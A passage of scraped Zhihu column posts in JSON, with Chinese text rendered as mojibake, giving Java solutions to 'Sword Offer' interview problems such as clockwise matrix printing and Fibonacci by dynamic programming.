class=\"na\">right</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">isSymmetrical</span><span class=\"o\">(</span><span class=\"n\">t1</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">t2</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>29. é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/9b4c81a02cd34f76be2659fa0d54342a%3FtpId%3D13%26tqId%3D11172%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä¸‹å›¾çš„çŸ©é˜µé¡ºæ—¶é’ˆæ‰“å°ç»“æœä¸ºï¼š1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-661d99e666148103d1bc36ebd4cd0f45_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"294\" data-rawheight=\"335\" class=\"content_image\" width=\"294\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;294&#39; height=&#39;335&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"294\" data-rawheight=\"335\" class=\"content_image lazy\" width=\"294\" data-actualsrc=\"https://pic2.zhimg.com/v2-661d99e666148103d1bc36ebd4cd0f45_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">printMatrix</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">matrix</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"kt\">int</span> <span class=\"n\">r1</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">r2</span> <span class=\"o\">=</span> <span class=\"n\">matrix</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">c1</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">c2</span> <span class=\"o\">=</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">].</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">r1</span> <span class=\"o\">&lt;=</span> <span class=\"n\">r2</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">c1</span> <span class=\"o\">&lt;=</span> <span class=\"n\">c2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">c1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">c2</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r1</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">r1</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">r2</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">c2</span><span class=\"o\">]);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">r1</span> <span class=\"o\">!=</span> <span class=\"n\">r2</span><span class=\"o\">)</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">c2</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">c1</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">--)</span>\n                <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r2</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c1</span> <span class=\"o\">!=</span> <span class=\"n\">c2</span><span class=\"o\">)</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">r2</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&gt;</span> <span class=\"n\">r1</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">--)</span>\n                <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">c1</span><span class=\"o\">]);</span>\n        <span class=\"n\">r1</span><span class=\"o\">++;</span> <span class=\"n\">r2</span><span class=\"o\">--;</span> <span class=\"n\">c1</span><span class=\"o\">++;</span> <span class=\"n\">c2</span><span class=\"o\">--;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764845", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 10-19", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#101-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97\" class=\"internal\">10.1 æ–æ³¢é‚£å¥‘æ•°åˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#102-%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96\" class=\"internal\">10.2 çŸ©å½¢è¦†ç›–</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#103-%E8%B7%B3%E5%8F%B0%E9%98%B6\" class=\"internal\">10.3 è·³å°é˜¶</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#104-%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6\" class=\"internal\">10.4 å˜æ€è·³å°é˜¶</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#11-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97\" class=\"internal\">11. æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#12-%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84\" class=\"internal\">12. çŸ©é˜µä¸­çš„è·¯å¾„</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#13-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4\" class=\"internal\">13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#14-%E5%89%AA%E7%BB%B3%E5%AD%90\" class=\"internal\">14. å‰ªç»³å­</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#15-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD-1-%E7%9A%84%E4%B8%AA%E6%95%B0\" class=\"internal\">15. äºŒè¿›åˆ¶ä¸­ 1 çš„ä¸ªæ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#16-%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9\" class=\"internal\">16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#17-%E6%89%93%E5%8D%B0%E4%BB%8E-1-%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84-n-%E4%BD%8D%E6%95%B0\" class=\"internal\">17. æ‰“å°ä» 1 åˆ°æœ€å¤§çš„ n ä½æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#181-%E5%9C%A8-o1-%E6%97%B6%E9%97%B4%E5%86%85%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E8%8A%82%E7%82%B9\" class=\"internal\">18.1 åœ¨ O(1) æ—¶é—´å†…åˆ é™¤é“¾è¡¨èŠ‚ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#182-%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9\" class=\"internal\">18.2 åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845/edit#19-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D\" class=\"internal\">19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</a> </li></ul><h2>10.1 æ–æ³¢é‚£å¥‘æ•°åˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/c6c7742f5ba7442aada113136ddea0c3%3FtpId%3D13%26tqId%3D11160%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>æ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç¬¬ n é¡¹ï¼Œn &lt;= 39ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-ee9a13c64aa14d66e245ad2259b20430_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"476\" data-rawheight=\"126\" class=\"origin_image zh-lightbox-thumb\" width=\"476\" data-original=\"https://pic1.zhimg.com/v2-ee9a13c64aa14d66e245ad2259b20430_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;476&#39; height=&#39;126&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"476\" data-rawheight=\"126\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"476\" data-original=\"https://pic1.zhimg.com/v2-ee9a13c64aa14d66e245ad2259b20430_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-ee9a13c64aa14d66e245ad2259b20430_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>å¦‚æœä½¿ç”¨é€’å½’æ±‚è§£ï¼Œä¼šé‡å¤è®¡ç®—ä¸€äº›å­é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œè®¡ç®— f(4) éœ€è¦è®¡ç®— f(3) å’Œ f(2)ï¼Œè®¡ç®— f(3) éœ€è¦è®¡ç®— f(2) å’Œ f(1)ï¼Œå¯ä»¥çœ‹åˆ° f(2) è¢«é‡å¤è®¡ç®—äº†ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-d1466ad75bfc9547e6352ecee7301ac3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"680\" data-rawheight=\"610\" class=\"origin_image zh-lightbox-thumb\" width=\"680\" data-original=\"https://pic4.zhimg.com/v2-d1466ad75bfc9547e6352ecee7301ac3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;680&#39; height=&#39;610&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"680\" data-rawheight=\"610\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"680\" data-original=\"https://pic4.zhimg.com/v2-d1466ad75bfc9547e6352ecee7301ac3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-d1466ad75bfc9547e6352ecee7301ac3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>é€’å½’æ˜¯å°†ä¸€ä¸ªé—®é¢˜åˆ’åˆ†æˆå¤šä¸ªå­é—®é¢˜æ±‚è§£ï¼ŒåŠ¨æ€è§„åˆ’ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä½†æ˜¯åŠ¨æ€è§„åˆ’ä¼šæŠŠå­é—®é¢˜çš„è§£ç¼“å­˜èµ·æ¥ï¼Œä»è€Œé¿å…é‡å¤æ±‚è§£å­é—®é¢˜ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">Fibonacci</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;=</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">fib</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">+</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span>\n    <span class=\"k\">return</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><p>è€ƒè™‘åˆ°ç¬¬ i é¡¹åªä¸ç¬¬ i-1 å’Œç¬¬ i-2 é¡¹æœ‰å…³ï¼Œå› æ­¤åªéœ€è¦å­˜å‚¨å‰ä¸¤é¡¹çš„å€¼å°±èƒ½æ±‚è§£ç¬¬ i é¡¹ï¼Œä»è€Œå°†ç©ºé—´å¤æ‚åº¦ç”± O(N) é™ä½ä¸º O(1)ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">Fibonacci</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;=</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">fib</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">fib</span> <span class=\"o\">=</span> <span class=\"n\">pre2</span> <span class=\"o\">+</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">fib</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">fib</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ç”±äºå¾…æ±‚è§£çš„ n å°äº 40ï¼Œå› æ­¤å¯ä»¥å°†å‰ 40 é¡¹çš„ç»“æœå…ˆè¿›è¡Œè®¡ç®—ï¼Œä¹‹åå°±èƒ½ä»¥ O(1) æ—¶é—´å¤æ‚åº¦å¾—åˆ°ç¬¬ n é¡¹çš„å€¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Solution</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">fib</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">40</span><span class=\"o\">];</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">Solution</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">fib</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n            <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">+</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">Fibonacci</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">fib</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>10.2 çŸ©å½¢è¦†ç›–</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/72a5a919508a4251859fb2cfb987a0e6%3FtpId%3D13%26tqId%3D11163%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>æˆ‘ä»¬å¯ä»¥ç”¨ 2*1 çš„å°çŸ©å½¢æ¨ªç€æˆ–è€…ç«–ç€å»è¦†ç›–æ›´å¤§çš„çŸ©å½¢ã€‚è¯·é—®ç”¨ n ä¸ª 2*1 çš„å°çŸ©å½¢æ— é‡å åœ°è¦†ç›–ä¸€ä¸ª 2*n çš„å¤§çŸ©å½¢ï¼Œæ€»å…±æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Ÿ</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-7a662579a815828a7e175142e178d328_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"177\" data-rawheight=\"453\" data-thumbnail=\"https://pic1.zhimg.com/v2-7a662579a815828a7e175142e178d328_b.jpg\" class=\"content_image\" width=\"177\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;177&#39; height=&#39;453&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"177\" data-rawheight=\"453\" data-thumbnail=\"https://pic1.zhimg.com/v2-7a662579a815828a7e175142e178d328_b.jpg\" class=\"content_image lazy\" width=\"177\" data-actualsrc=\"https://pic1.zhimg.com/v2-7a662579a815828a7e175142e178d328_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>å½“ n ä¸º 1 æ—¶ï¼Œåªæœ‰ä¸€ç§è¦†ç›–æ–¹æ³•ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-d2b2b221e3d702541f5036bcd57741e3_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"159\" data-rawheight=\"244\" class=\"content_image\" width=\"159\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;159&#39; height=&#39;244&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"159\" data-rawheight=\"244\" class=\"content_image lazy\" width=\"159\" data-actualsrc=\"https://pic4.zhimg.com/v2-d2b2b221e3d702541f5036bcd57741e3_b.png\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å½“ n ä¸º 2 æ—¶ï¼Œæœ‰ä¸¤ç§è¦†ç›–æ–¹æ³•ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0e537ff338acae6c238ac72d8cb39c1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"260\" class=\"content_image\" width=\"314\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;314&#39; height=&#39;260&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"260\" class=\"content_image lazy\" width=\"314\" data-actualsrc=\"https://pic3.zhimg.com/v2-0e537ff338acae6c238ac72d8cb39c1e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è¦è¦†ç›– 2*n çš„å¤§çŸ©å½¢ï¼Œå¯ä»¥å…ˆè¦†ç›– 2*1 çš„çŸ©å½¢ï¼Œå†è¦†ç›– 2*(n-1) çš„çŸ©å½¢ï¼›æˆ–è€…å…ˆè¦†ç›– 2*2 çš„çŸ©å½¢ï¼Œå†è¦†ç›– 2*(n-2) çš„çŸ©å½¢ã€‚è€Œè¦†ç›– 2*(n-1) å’Œ 2*(n-2) çš„çŸ©å½¢å¯ä»¥çœ‹æˆå­é—®é¢˜ã€‚è¯¥é—®é¢˜çš„é€’æ¨å…¬å¼å¦‚ä¸‹ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"651\" data-rawheight=\"145\" class=\"origin_image zh-lightbox-thumb\" width=\"651\" data-original=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;651&#39; height=&#39;145&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"651\" data-rawheight=\"145\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"651\" data-original=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">RectCover</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span 